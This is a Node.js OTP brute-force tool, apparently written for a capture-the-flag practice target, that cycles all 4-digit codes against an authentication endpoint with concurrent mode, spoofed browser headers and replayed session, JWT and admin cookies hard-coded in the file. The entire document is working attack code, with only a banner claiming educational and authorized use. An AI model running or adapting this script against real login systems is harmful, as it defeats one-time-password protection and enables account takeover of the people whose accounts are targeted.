require('dotenv').config();
const axios = require('axios');

const CONFIG = {
    target: process.env.TARGET_HOST,
    endpoint: process.env.TARGET_ENDPOINT || '/phase1/auth/otp_challenge',
    startOTP: 0,
    endOTP: 9999,
    concurrentRequests: 1,
    timeout: 5000,
    delayBetweenRequests: 100
};

const HEADERS = {
    'Host': new URL(CONFIG.target).hostname,
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:149.0) Gecko/20100101 Firefox/149.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-GB,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': `${CONFIG.target}${CONFIG.endpoint}`,
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': CONFIG.target,
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=0, i',
    'Te': 'trailers',
    'Connection': 'keep-alive'
};

const COOKIES = {
    'Hidden-Flag-Part': process.env.COOKIE_HIDDEN_FLAG_PART || 'Check_The_Headers_Instead',
    'UserData': process.env.COOKIE_USER_DATA || 'VXNlcjpBZG1pbnxDcmVkaXRDYXJkOjQ0NDQtNTU1NS02NjY2LTc3Nzd8RmxhZzpNZXJkZWthU2liZXJ7VW4zbmNyeXB0M2RfQzAwazEzX1AxMX0=',
    'IsAdmin': process.env.COOKIE_IS_ADMIN || '0',
    'session': process.env.COOKIE_SESSION || '.eJyrViooSo1PLC3JiC8tTi1SslJKTMnNzFPSUSouSS0wjE_Jz0tVsiopKk2FiBghidQCAKe-FfM.adsJ4Q.vJukFR-ExxzqgIeI1dufluQzDXU',
    'accessToken': process.env.COOKIE_ACCESS_TOKEN || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmYWE4MWU2My1jNWVjLTRhYjAtODhjZi0yODE4NzhlNWMxZTEiLCJyb2xlIjoiUEFSVElDSVBBTlQiLCJpYXQiOjE3NzYyMzc0ODIsImV4cCI6MTc3NjIzODM4Mn0.jS2QQc__LPTGgMxLsIA2SRaRAR0l93ylHKvoWgrQE5Q'
};

function buildCookieString() {
    return Object.entries(COOKIES)
        .map(([key, value]) => `${key}=${value}`)
        .join('; ');
}

function formatOTP(otp) {
    return otp.toString().padStart(4, '0');
}

async function tryOTP(otp) {
    const cookieString = buildCookieString();
    const otpFormatted = formatOTP(otp);
    
    try {
        const response = await axios.post(
            `${CONFIG.target}${CONFIG.endpoint}`,
            `otp=${otpFormatted}`,
            {
                headers: {
                    ...HEADERS,
                    'Cookie': cookieString,
                    'Content-Length': `otp=${otpFormatted}`.length.toString()
                },
                timeout: CONFIG.timeout,
                maxRedirects: 0,
                validateStatus: () => true
            }
        );
        
        return {
            otp: otpFormatted,
            status: response.status,
            success: isSuccess(response),
            headers: response.headers,
            data: response.data
        };
    } catch (error) {
        return {
            otp: otpFormatted,
            status: error.response?.status || 'ERROR',
            success: false,
            error: error.message
        };
    }
}

function isSuccess(response) {
    if (response.status === 302 || response.status === 301) {
        return true;
    }
    
    if (response.status === 200) {
        const data = response.data;
        if (typeof data === 'string') {
            const lowerData = data.toLowerCase();
            
            const errorPatterns = [
                'otp salah',
                'coba lagi',
                'salah',
                'incorrect',
                'invalid',
                'wrong',
                'gagal',
                'error'
            ];
            
            const hasError = errorPatterns.some(pattern => lowerData.includes(pattern));
            
            if (!hasError) {
                return true;
            }
        }
    }
    
    return false;
}

async function bruteForceSequential() {
    console.log('🚀 Starting OTP Brute Force Attack');
    console.log(`📊 Range: ${formatOTP(CONFIG.startOTP)} - ${formatOTP(CONFIG.endOTP)}`);
    console.log(`🎯 Target: ${CONFIG.target}${CONFIG.endpoint}`);
    console.log(`⏱️  Timeout: ${CONFIG.timeout}ms per request\n`);
    
    const startTime = Date.now();
    let attempts = 0;
    let successfulOTP = null;
    
    for (let otp = CONFIG.startOTP; otp <= CONFIG.endOTP && !successfulOTP; otp++) {
        attempts++;
        
        const result = await tryOTP(otp);
        
        if (attempts % 100 === 0) {
            const elapsed = Date.now() - startTime;
            const rate = (attempts / (elapsed / 1000)).toFixed(2);
            console.log(`📈 Progress: ${attempts} attempts | ${(attempts / 100).toFixed(1)}% complete | Rate: ${rate} req/s`);
        }
        
        if (result.success) {
            successfulOTP = result;
            console.log('\n✅ SUCCESS! Valid OTP found!\n');
            console.log(`🔑 OTP Code: ${result.otp}`);
            console.log(`📊 Status: ${result.status}`);
            console.log(`⏱️  Total attempts: ${attempts}`);
            console.log(`⏰ Time elapsed: ${((Date.now() - startTime) / 1000).toFixed(2)}s`);
            
            if (result.headers) {
                console.log(`📍 Location: ${result.headers['location'] || result.headers['Location'] || 'N/A'}`);
            }
            
            break;
        }
        
        await new Promise(resolve => setTimeout(resolve, CONFIG.delayBetweenRequests));
    }
    
    if (!successfulOTP) {
        console.log('\n❌ No valid OTP found in the specified range');
        console.log(`📊 Total attempts: ${attempts}`);
        console.log(`⏰ Time elapsed: ${((Date.now() - startTime) / 1000).toFixed(2)}s`);
    }
    
    return successfulOTP;
}

async function bruteForceConcurrent() {
    console.log('🚀 Starting Concurrent OTP Brute Force Attack');
    console.log(`📊 Range: ${formatOTP(CONFIG.startOTP)} - ${formatOTP(CONFIG.endOTP)}`);
    console.log(`🔄 Concurrent requests: ${CONFIG.concurrentRequests}`);
    console.log(`🎯 Target: ${CONFIG.target}${CONFIG.endpoint}\n`);
    
    const startTime = Date.now();
    const totalAttempts = CONFIG.endOTP - CONFIG.startOTP + 1;
    let completed = 0;
    let successfulOTP = null;
    
    const otps = Array.from({length: totalAttempts}, (_, i) => CONFIG.startOTP + i);
    
    for (let i = 0; i < otps.length; i += CONFIG.concurrentRequests) {
        if (successfulOTP) break;
        
        const batch = otps.slice(i, i + CONFIG.concurrentRequests);
        const promises = batch.map(otp => tryOTP(otp));
        
        const results = await Promise.all(promises);
        
        for (const result of results) {
            completed++;
            
            if (result.success) {
                successfulOTP = result;
                console.log('\n✅ SUCCESS! Valid OTP found!\n');
                console.log(`🔑 OTP Code: ${result.otp}`);
                console.log(`📊 Status: ${result.status}`);
                console.log(`⏱️  Total attempts: ${completed}`);
                console.log(`⏰ Time elapsed: ${((Date.now() - startTime) / 1000).toFixed(2)}s`);
                
                if (result.headers) {
                    console.log(`📍 Location: ${result.headers['location'] || result.headers['Location'] || 'N/A'}`);
                }
                
                break;
            }
        }
        
        if (completed % 100 === 0) {
            const elapsed = Date.now() - startTime;
            const rate = (completed / (elapsed / 1000)).toFixed(2);
            const progress = ((completed / totalAttempts) * 100).toFixed(1);
            console.log(`📈 Progress: ${completed} attempts | ${progress}% complete | Rate: ${rate} req/s`);
        }
    }
    
    if (!successfulOTP) {
        console.log('\n❌ No valid OTP found in the specified range');
        console.log(`📊 Total attempts: ${completed}`);
        console.log(`⏰ Time elapsed: ${((Date.now() - startTime) / 1000).toFixed(2)}s`);
    }
    
    return successfulOTP;
}

async function main() {
    console.log('╔════════════════════════════════════════════════════════════╗');
    console.log('║     OTP Brute Force Tool - Educational Purpose Only        ║');
    console.log('║     Authorized Cybersecurity Practice Environment          ║');
    console.log('╚════════════════════════════════════════════════════════════╝\n');
    
    const mode = process.argv[2] === 'concurrent' ? 'concurrent' : 'sequential';
    
    try {
        if (mode === 'concurrent') {
            await bruteForceConcurrent();
        } else {
            await bruteForceSequential();
        }
    } catch (error) {
        console.error('❌ Error:', error.message);
    }
}

if (require.main === module) {
    main();
}

module.exports = { tryOTP, bruteForceSequential, bruteForceConcurrent };
